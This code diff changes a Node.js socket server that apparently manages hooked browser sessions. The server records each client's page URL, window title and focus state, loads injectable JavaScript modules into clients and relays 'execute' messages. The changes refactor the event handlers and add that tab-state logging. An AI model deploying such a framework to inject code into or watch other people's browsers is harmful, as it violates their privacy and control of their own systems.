@@ -1385,7 +1385,8 @@ MongoClient.connect(config.mongodb, (err, client) => {
           'window': {
             'title': '',
             'url': authReq.headers.referer,
-            'favicon': authReq.headers.referer ? 'https://plus.google.com/_/favicon?domain_url=' + encodeURIComponent(authReq.headers.referer) : ''
+            'favicon': authReq.headers.referer ? 'https://plus.google.com/_/favicon?domain_url=' + encodeURIComponent(authReq.headers.referer) : '',
+            'focused': false,
           },
           'socket': {
             'headers': socket.headers,
@@ -1450,20 +1451,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
             if (topic !== rawData.t) return
             callback(rawData.d)
           }
-  
-          on('e', data => { // error
-            send('error', data)
-            console.log(data)
-          })
-  
-          on('execute', data => { // execute
-            send('execute', data)
-          })
-  
+
           /**
            * Module loader
            */
-          on('module', data => { // load a module
+          on('module', data => {
             try {
               if (!data.name) return
               let js = inject.modules[data.name]
@@ -1503,13 +1495,59 @@ MongoClient.connect(config.mongodb, (err, client) => {
               )
             }
           })
-  
-          on('r', data => { // response
+
+          /**
+           * Client info logger
+           */
+          on('i', data => {
+            /**
+             * Max string length
+             */
+            let maxStringLength = 100
+            let maxUrlLength = 2083
+            /**
+             * Safely parse data
+             */
+            if (typeof data === 'object') {
+              if (typeof data.window === 'object') {
+                let { title, url, focused } = data.window
+                if (typeof title === 'string')
+                  session.window.title = title.substring(0, maxStringLength)
+                if (typeof url === 'string')
+                  session.window.url = url.substring(0, maxUrlLength)
+                if (typeof focused === 'boolean')
+                  session.window.focused = focused
+              }
+            }
+          })
+
+          /**
+           * Data logger
+           */
+          on('l', data => {
             console.log(data)
           })
-  
-          on('ping', pingTime => { // ping
+          
+          /**
+           * Error logger
+           */
+          on('e', data => {
+            send('error', data)
+            console.log(data)
+          })
+          
+          /**
+           * Get server ping time
+           */
+          on('ping', pingTime => {
             send('pong', pingTime)
+          })
+
+          /**
+           * For testing execute's from the client side
+           */
+          on('execute', data => {
+            send('execute', data)
           })
         })
   
